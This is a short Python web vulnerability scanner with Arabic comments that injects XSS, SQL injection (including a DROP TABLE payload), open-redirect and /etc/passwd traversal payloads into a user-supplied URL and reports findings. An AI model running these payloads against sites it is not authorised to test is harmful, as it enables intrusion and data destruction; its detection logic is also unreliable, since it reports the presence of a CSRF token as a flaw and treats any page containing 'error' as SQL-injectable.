import requests
import urllib.parse
import time

# مجموعة Payloads للفحص القوي
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "'><script>alert(1)</script>"
]

SQLI_PAYLOADS = [
    "' OR '1'='1", "\" OR \"1\"=\"1", "'--", "\"--", "'; DROP TABLE users;--", "' OR '1'='1' --"
]

# دوال الفحص
def check_xss(url):
    try:
        parsed_url = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed_url.query)
        if not query:
            return False
        for param in query:
            for payload in XSS_PAYLOADS:
                new_query = query.copy()
                new_query[param] = payload
                new_query_string = urllib.parse.urlencode(new_query, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query_string}"
                res = requests.get(test_url)
                if payload in res.text:
                    return True
    except:
        pass
    return False

def check_sqli(url):
    try:
        parsed_url = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed_url.query)
        if not query:
            return False
        for param in query:
            for payload in SQLI_PAYLOADS:
                new_query = query.copy()
                new_query[param] = payload
                new_query_string = urllib.parse.urlencode(new_query, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query_string}"
                res = requests.get(test_url)
                if any(error in res.text.lower() for error in ["sql", "syntax", "mysql", "error"]):
                    return True
    except:
        pass
    return False

def check_csrf(url):
    try:
        res = requests.get(url)
        if "csrf" in res.text.lower() or "csrf_token" in res.text.lower():
            return True
    except:
        pass
    return False

def check_open_redirect(url):
    try:
        payload = "http://malicious.com"
        test_url = url + "?redirect=" + payload
        res = requests.get(test_url)
        if payload in res.url:
            return True
    except:
        pass
    return False

def check_directory_traversal(url):
    try:
        payload = "../../../../etc/passwd"
        test_url = url + "/" + payload
        res = requests.get(test_url)
        if "root:" in res.text:
            return True
    except:
        pass
    return False

def check_http_headers(url):
    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        res = requests.get(url, headers=headers)
        if 'X-Content-Type-Options' not in res.headers:
            return True
    except:
        pass
    return False

# تشغيل الفحص
def start_scan():
    url = input("🟡 أدخل الرابط للفحص: ").strip()
    if not url.startswith("http"):
        url = "http://" + url

    print("\n🔍 جاري الفحص...\n")

    if check_xss(url):
        print("[✔] تم العثور على ثغرة XSS!")
    else:
        print("[✘] لم يتم العثور على ثغرة XSS.")

    if check_sqli(url):
        print("[✔] تم العثور على ثغرة SQL Injection!")
    else:
        print("[✘] لم يتم العثور على ثغرة SQLi.")

    if check_csrf(url):
        print("[✔] الموقع يحتوي على رمز CSRF يمكن استغلاله.")
    else:
        print("[✘] لم يتم العثور على CSRF.")

    if check_open_redirect(url):
        print("[✔] تم العثور على ثغرة Open Redirect!")
    else:
        print("[✘] لا توجد Open Redirect.")

    if check_directory_traversal(url):
        print("[✔] تم اكتشاف ثغرة Directory Traversal!")
    else:
        print("[✘] لم يتم اكتشاف ثغرة Directory Traversal.")

    if check_http_headers(url):
        print("[✔] رؤوس HTTP غير محمية بشكل كافٍ!")
    else:
        print("[✘] رؤوس HTTP تبدو آمنة.")

# يشغّل الفحص تلقائيًا عند تشغيل الملف
if __name__ == "__main__":
    start_scan()
